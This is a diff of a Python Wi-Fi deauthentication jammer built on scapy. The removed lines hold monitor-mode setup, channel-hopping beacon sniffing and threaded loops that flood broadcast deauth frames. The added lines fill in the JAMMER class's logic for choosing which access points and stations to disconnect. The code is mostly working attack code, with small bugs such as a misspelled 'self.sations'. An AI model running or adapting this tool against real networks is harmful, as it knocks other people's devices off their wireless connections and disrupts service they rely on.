@@ -10,7 +10,6 @@ import signal
 import random
 import subprocess
 import re
-
 from pull import PULL
 from scapy.sendrecv import sniff
 from scapy.layers.dot11 import Dot11Beacon
@@ -19,162 +18,6 @@ from scapy.layers.dot11 import Dot11Elt
 from scapy.layers.dot11 import RadioTap
 from scapy.layers.dot11 import Dot11Deauth
 from scapy.layers.eap   import EAPOL
-
-def getNICnames():
-	ifaces = []
-	dev = open('/proc/net/dev', 'r')
-	data = dev.read()
-	for n in re.findall('[a-zA-Z0-9]+:', data):
-		ifaces.append(n.rstrip(":"))
-	return ifaces
-
-def ifaceCard():
-	global interface
-	cards = []
-	ifnames = getNICnames()
-	for n in ifnames:
-		if 'wlan' in n or 'mon' in n:
-			cards.append(n)
-	if len(cards) == 0:
-		print "["+R+"!"+W+"] No Wireless Card Detected\n[*]Exiting in 3 Seconds"
-		time.sleep(3)
-		sys.exit()
-	print "Write The Name of Desired Wireless Interface. Available are: "
-	for p in cards:
-		print p
-	while True:
-		ppt = raw_input("Enter The Name of Desired Wireless Interface: ")
-		if ppt in cards:
-			os.system('clear')
-			break
-	interface = ppt
-	return
-
-def monMode(iface):
-	out__ = open(os.devnull, 'wb')
-	if not confirmMon(iface):
-		try:
-			co = subprocess.call(['systemctl stop NetworkManager'], stdout=out__, stderr=out__)
-			if co == 0:
-				print "Killed"+" "+P+"Network Manager"					
-		except:
-			co = subprocess.call(['service', 'NetworkManager', 'stop'], stdout=out__, stderr=out__)
-			if co == 0:
-				print "Killed"+" "+P+"Network Manager"+W 
-		os.system('ifconfig %s down' % iface)
-		ab = os.system('iwconfig %s mode monitor' % iface)
-		if ab != 0:
-			os.system('ifconfig %s up' % iface)
-			sys.exit(R+"Failed to Put Card in Monitor Mode")
-		os.system('ifconfig %s up' % iface)
-		print T+iface+W+" in monitor mode"
-		out__.close()
-		return True
-
-def monModeOff(iface):
-	out__ = open(os.devnull, 'wb')
-	if confirmMon(iface):
-		try:
-			co = subprocess.call(['systemctl start NetworkManager'], stdout=out__, stderr=out__)					
-		except:
-			co = subprocess.call(['service', 'NetworkManager', 'start'], stdout=out__, stderr=out__)
-		os.system('ifconfig %s down' % iface)
-		if os.system('iwconfig %s mode managed' % iface) != 0 :
-			os.system('ifconfig %s up' % iface)
-			sys.exit(R+"Failed to Put Card in Managed Mode")
-		os.system('ifconfig %s up' % iface)
-		out__.close()
-		return True
-
-def confirmMon(iface):
-	co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
-	data = co.communicate()[0]
-	card = re.findall('Mode:[A-Za-z]+', data)[0]	
-	if "Monitor" in card:
-		return True
-	else:
-		return False	
-
-def aodStart(iface):
-	null = open(os.devnull, 'wb')
-	try:
-		subprocess.Popen(['airodump-ng', iface], stdout=null, stderr=null)
-	except KeyboardInterrupt:
-		pass
-	finally:
-		null.close()
-
-def collectDat(pkt):
-	global list_, out_
-	if pkt.haslayer(Dot11):
-		if pkt.haslayer(Dot11Beacon) and pkt.getlayer(Dot11).addr2 not in list_:
-			if pkt.getlayer(Dot11).addr2 in out_:
-				print R+"Removed"+W+", BSSID: %s ESSID: %S" % (pkt.getlayer(Dot11).addr2, pkt.getlayer(Dot11Elt).info)	
-			else: 
-				list_.append(str(pkt.getlayer(Dot11).addr2))
-				set(list_)
-				if pkt.haslayer(Dot11Elt):
-					ssid = pkt.getlayer(Dot11Elt).info
-				else:
-					ssid = "NO SSID"		
-				print G+"Added"+W+", BSSID: %s ESSID: %s" % (pkt.getlayer(Dot11).addr2, str(ssid))
-def sniffDat():
-	global interface
-	ch = 1
-	null_ = open(os.devnull, 'wb')
-	while True:
-		try:
-			subprocess.call(['iwconfig', interface, 'channel', str(ch)], stdout=null_, stderr=null_)
-			if ch < 11:
-				ch = ch+1
-			else:
-				ch = 1
-			sniff(iface=interface, prn=collectDat, count=2)
-		except Exception:
-			pass
-	null_.close()
-	return
-
-def deauthDev(tgt):
-	global interface
-	pckt = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=tgt, addr3=tgt) / Dot11Deauth()
-	while True:
-		try:
-			sendp(pckt, iface=interface, verbose=False)
-		except Exception:
-			break
-	return
-		
-
-def deauthDev2(sc, dst):
-	global interface
-	norm = "FF:FF:FF:FF:FF:FF"
-	pckt = RadioTap() / Dot11(addr1=dst, addr2=sc, addr3=sc) / Dot11Deauth()
-	while True:
-		try:
-			sendp(pckt, iface=interface, verbose=False)
-			if dst == norm or dst == "":
-				print "Sent Deauth Packet to %s" % str(sc)
-				time.sleep(0.5)
-			else:
-				print "Send Deauth Packet From %s to %s" % (str(sc), str(dst))
-		except KeyboardInterrupt:
-			break
-		
-
-def collectDev():
-	global list_, run_list
-	for tgt in list_:
-		if tgt not in run_list:
-			thread = threading.Thread(target=deauthDev, args=(tgt,), name="deauth")
-			thread.daemon = True
-			thread.start()
-			run_list.append(tgt)
-		else:
-			pass
-
-def apDeauth(sc,dst="FF:FF:FF:FF:FF:FF"):
-	deauthDev2(sc, dst)
 
 class JAMMER:
 
@@ -241,19 +84,50 @@ class JAMMER:
 
 	def deauthenticate(self, sender, receiver):
 		if self.aps and self.stations and self.filters:
-			
+			if not sender in self.filters and not receiver in self.filters:
+				if sender in self.aps or receiver in self.aps or sender in self.stations or receiver in self.stations:
+					self.send(
+						sender,
+						receiver
+					)
 		elif self.aps and self.stations and not self.filters:
-
+			if sender in self.aps or receiver in self.aps or sender in self.stations or receiver in self.stations:
+				self.send(
+					sender,
+					receiver
+				)
 		elif self.aps and not self.stations and self.filters:
-
+			if not sender in self.filters and not receiver in self.filters:
+				if sender in self.aps or receiver in self.aps:
+					self.send(
+						sender,
+						receiver
+					)
 		elif not self.aps and self.stations and self.filters:
-
-		elif self.aps and not stations and not self.filters:
-
+			if not sender in self.filters and not receiver in self.filters:
+				if sender in self.stations or receiver in self.stations:
+					self.send(
+						sender,
+						receiver
+					)
+		elif self.aps and not self.stations and not self.filters:
+			if sender in self.aps or receiver in self.aps:
+				self.send(
+					sender,
+					receiver
+				)
 		elif not self.aps and not self.stations and self.filters:
-
+			if not sender in self.filters and not receiver in self.filters:
+				self.send(
+					sender,
+					receiver
+				)
 		elif not self.aps and self.sations and not self.filters:
-
+			if sender in self.stations or receiver in self.stations:
+				self.send(
+					sender,
+					receiver
+				)
 		else:
 			self.send(sender, receiver)
 
@@ -461,5 +335,3 @@ def main():
 if __name__ == "__main__":
 	pull = PULL()
 	main()
-		
-	
